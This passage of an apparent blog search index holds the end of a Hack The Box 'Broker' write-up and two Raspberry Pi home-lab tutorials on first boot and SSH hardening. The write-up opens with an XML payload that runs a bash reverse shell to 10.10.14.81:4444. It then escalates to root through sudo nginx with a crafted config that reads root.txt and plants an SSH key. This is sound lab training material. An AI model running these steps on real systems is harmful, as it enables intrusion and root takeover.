/dev/tcp/10.10.14.81/4444 0&amp;gt;&amp;amp;1&lt;/value&gt;                &lt;!-- &lt;value&gt;bash&lt;/value&gt;                &lt;value&gt;-c&lt;/value&gt;                &lt;value&gt;touch /tmp/success&lt;/value&gt; --&gt;            &lt;/list&gt;            &lt;/constructor-arg&gt;        &lt;/bean&gt;    &lt;/beans&gt;In a different terminal i initiated a python webserver (python -m http.server) to serve the shell.xml, the payload for our exploit.python -m http.serverNow I executed the ActiveMQ exploit. running the exploit reverse shellI was able obtain reverse shell and now we own the user of machine.From User to Root:I ensured to stabilize the shell.python -c 'import pty; pty.spawn(\"/bin/bash\")'Ctrl-Zstty raw -echo; fg#Press Enter twice, and type the command export TERM=xterm   While you enter ctrl-z you will see a session suspended message. no worries it just backgrounds the terminal, and you will regain the session once you enter fg and the view will be fixed with export TERM=xtermNow as we have a stable shell first thing I did was to execute sudo -l command.activemq@broker:~$ sudo  -l Matching Defaults entries for activemq on broker:    env_reset, mail_badpass,    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin,    use_ptyUser activemq may run the following commands on broker:    (ALL : ALL) NOPASSWD: /usr/sbin/nginxactivemq@broker:~$ It shows we have the abliity to run nginx with sudo privileges without password.I spend some time with nginx documentaion and could  figure out that we may can create config file for nginx and make nginx to read or put files in root directory.Another reference: Nginx Full Example configurationLet’s give it a try right! I created a config file shell.conf that would allow us to read as well as put file to root users directory.user root;events {\tworker_connections 1024;}http {\tserver{\t\tlisten 1337;\t\troot /;\t\tdav_methods PUT;\t}}Next step was to make nginx use our custom conf file by running the command.activemq@broker:~$ sudo /usr/sbin/nginx -c /home/activemq/shell.conf Method 1:By using curl I tried to read the root.txt file from root user home directory.activemq@broker:~$ curl localhost:1337/root/root.txtIt worked and we had our root flag.Method 2:Now, our crafted conf file enables the option to PUT any file in to root users home directory. We can leverage that to generate ssh keys and have it put under /root/.ssh/authorized_keys.Created RSA SSH key pair from my host machine and pasted the public key using curl command. ssh-keygen curl to PUT authorized_keyOnce I pasted the RSA public key, I used the private key to login to the machine as root user. SSH login as rootWe have the machine ROOTED!"
  },
  
  {
    "title": "Home Lab Series | Part 2 | Hardening SSH login",
    "url": "/posts/hls-hardening-SSH/",
    "categories": "Blogging, Tutorial, Home Lab Series",
    "tags": "Raspberry Pi, Write Up",
    "date": "2023-12-02 15:00:00 +0530",
    





    
    "snippet": "If you’re utilizing SSH for device access, is it secure? The questions you may ask yourself: is your SSH login robust? Are default accounts in use? Is your device exposed to the internet, potential...",
    "content": "If you’re utilizing SSH for device access, is it secure? The questions you may ask yourself: is your SSH login robust? Are default accounts in use? Is your device exposed to the internet, potentially vulnerable to prying eyes?  Consider the digital fingerprint you leave across the web; an attacker, through OSINT, might compile a wordlist to exploit weak passwords via a dictionary attack.This article delves into best practices to harden your device’s SSH login.Steps  Limiting SSH Access  Modifying SSH configLimiting SSH AccessWhy limit the SSH access?  You may not need to provide SSH login access to all accounts on your device(s). For example, enabling SSH login for the root account with a weak password could potentially expose vulnerabilities, allowing attackers to brute force their way into the account or guess the password.By default the pi user or user account that created while customization doesn’t require a password while elevating itself to root.Create a new userWhile logged in with your default account enter the following commands to create a user. I do recommend using a complex password with minimum 14 characters or more in length.sudo adduser &lt;username&gt;  Example sudo adduser testuserDisabling Default accountOnce you have a new account created lets go ahead and disable the default pi account  Do test out your login with new user account before disabling pi user.sudo usermod --lock --expiredate 1 piCreate user groupWe will create a user group specific for SSH login. This will allow you to  add users under the group whom you want to have SSH access.  Creating different user groups for different role based purpose helps in managing and limiting users access to the system. This approach is called as role-based access control (RBAC)Enter the following commands to create a user:sudo groupadd &lt;groupame&gt;   Example: sudo groupadd sshgroupYou can add users to the group by entering the command below.sudo usermod -aG &lt;groupname&gt; &lt;username&gt;   Example: sudo usermod -aG sshgroup testuserSetting up Key-based AuthenticationUsing keys, for SSH (Se­cure Shell) is a safer and easier alternative to password authentication. Instead of relying on a password for access, the key-based login method relies on cryptographic keys. We generate a pair of cryptographic keys: one private, and one public. The private key stays with the client system. The public key goes to the server/system.Generating SSH Key Pair:On your local host machine (client), on a terminal window enter the following command to generate an SSH key pairssh-keygen -t ed25519 -a 600  -t ed25519: Specifies the type of key to create, in this case, an Ed25519 key. Ed25519 is a type of elliptic curve cryptography and is considered secure and efficient.  -a 600:  Specifies the number of key derivation function (KDF) rounds.Copy Public Key to Server:Use the following command to copy your public key to the remote server. Replace user with your actual username and server_ipssh-copy-id -i &lt;pub key&gt; &lt;username&gt;@&lt;server_ip&gt;  Test your SSH connection by connecting to your server ssh username@server_ipModifying SSH configModifying ssh configurations ensure to an access control is in place basically what’s allowed and how you can connect to your server. The main configuration file for the SSH daemon is typically located at /etc/ssh/sshd_config on Linux systems. In our case Raspbian is a linux OS :PDisabling Root Login:Disabling root login is generally recommended. Instead, use a regular user account and then switch to the root user using sudor or a similar mechanism after logging in.PermitRootLogin noDiabling Password Authentication:Disabling password authentication in favor of key-based authentication enhances security by reducing the risk of brute-force attacks.PasswordAuthentication noAllowing only users from a Group(s):Limit SSH access to specific groups. This helps in controlling who can connect to the server.AllowGroups sshgroupPort:Changing the default SSH port (22) can help mitigate automated attacks targeting the default port. However, be cautious with this change to avoid locking yourself out.Port: 2299PermitEmptyPasswords:Ensure that empty passwords are not allowed to enhance security.PermitEmptyPasswords noPubkeyAuthentication:Confirm that public key authentication is enabled. This is a more secure method compared to password authentication.PubkeyAuthentication yesProtocol:Ensure that you’re using SSH protocol version 2, as it includes security improvements over version 1.Protocol 2UsePAM:Use PAM (Pluggable Authentication Modules) for additional authentication and session management. This is generally enabled by default and is really optional to set up a PAM solution for your DIY homeserver. In this case we do not need a PAM solution hence having it disabled.UsePAM no   If you are integrating a PAM solution, set the option to UsePAM yesX11Forwarding:X11 forwarding allows graphical applications to be run on a remote server but displayed on your local machine. While X11 forwarding can be useful, it also introduces potential security risks, especially if you are connecting to untrusted servers.X11Forwarding noEnable Connection TimeoutsThis is to enhance the security of your SSH server, you can configure connection timeouts to automatically terminate idle SSH connections after a certain period. This helps to mitigate the risk of unauthorized access and potential security threats.With the below configurations, the server will send keep alive message to client every 100 seconds and will terminate the session after 3 attempts. This configuration will disconnect unresponsive SSH clients after approximately 5 minutes.ClientAliveInterval 100ClientAliveCountMax 3  ClientAliveInterval Set the interval at which the server will send a keep-alive message to the client (in seconds).  ClientAliveCountMax Set the maximum number of client alive messages the server will send before disconnecting the client.After making the changes, restart the SSH service for the configuration to take effect :).sudo systemctl restart ssh."
  },
  
  {
    "title": "Home Lab Series | Part 1 | First Boot with Raspberry Pi",
    "url": "/posts/home-lab-first-boot-pi-5/",
    "categories": "Blogging, Tutorial, Home Lab Series",
    "tags": "Raspberry Pi, Write Up",
    "date": "2023-11-26 11:00:00 +0530",
    





    
    "snippet": "In this article, we will focus on setting up Raspberry pi with Raspbian OS (Raspberry Pi OS) and further establish a connection with SSH considering best practice to have a secure way to sign in.Ch...",
    "content": "In this article, we will focus on setting up Raspberry pi with Raspbian OS (Raspberry Pi OS) and further establish a connection with SSH considering best practice to have a secure way to sign in.Choosing the right OS essentially depends on the use case of your home lab/server, what do you plan to do with it? a media server, selfhosting a website, NAS storage or all of them. This can be achieved by deploying multiple docker instances or by installing relevant packages and configuring them either way it up to you and your personal choice.For me, I am going to stick with Raspberry OS and docker instance for each relevant use case.Pre- requirements:  Micro SD card  Raspberry Pi Imager (Download link - https://www.raspberrypi.com/software/)  Internet connection (of course)  Raspberry PI device (you might need one :P)  USB card reader or an adapterInstalling an OSInstalling Raspberry Pi ImagerDownload the official Raspberry Pi imager and install according to your host system.For ubuntu or similar distro use the below command to install Raspberry Pi Imagersudo apt install rpi-imagerOnce installed connect your MicroSD card to your system either through an adapter or USB card reader.Selecting Pi DeviceOpen Raspberry Pi imager select your device in my case its Raspberry Pi 5.Raspberry PI Imager Device SelectionSelecting the OSSelect the desired OS there are few to select the one that is displayed by default are either 64 bit or 32 bit which with desktop environment (GUI). OS SelectionIf you want to see more options scroll down a bit and you can see Raspberry Pi OS (other) Raspberry Pi OS other optionsPersonally, I prefer Raspberry Pi OS lite (x64) given its light with no desktop environment and is only 400MB in size. Which makes it perfect for my use case as I can utilize the extra resource for docker instances I get eliminating desktop environments. Selecting 64bit Lite VersionSelecting Storage Media and OS CustomizationOnce you have selected the OS, now select the storage device in our case, the MicroSD card. Selecting Storage DeviceFurther when we move to the next step the imager will prompt you if you would like to customize you OS. OS CustomizationProvide a hostname for your device, username password, configure wireless connection in case you need to and select the region. CustomizationMoving on to the next tab “Services” select password authentication for your SSH login. Enabling SSHYou can generate a keypair now, but I would suggest doing it later as we need to do some hardening later.Click next and you will be getting another prompt with confirmation asking if you are sure with applying the customization. Hit Yes ! Prompt on Customization Prompt on Storage Data Wipe Writing DataIt will take up to 15 minutes depending on your system and microSD card. Raspberry Pi imager will write the OS and verify your files before completing. Done!Done!  Now put your MicroSD card into your Pi and connect the power source.Post Installation  You can either login to your router page or use nmap to list the IP address of your Pisudo nmap -sn [Your router's IP address]/24# Example:  nmap -sn 192.168.0.1/24"
  }
  
]

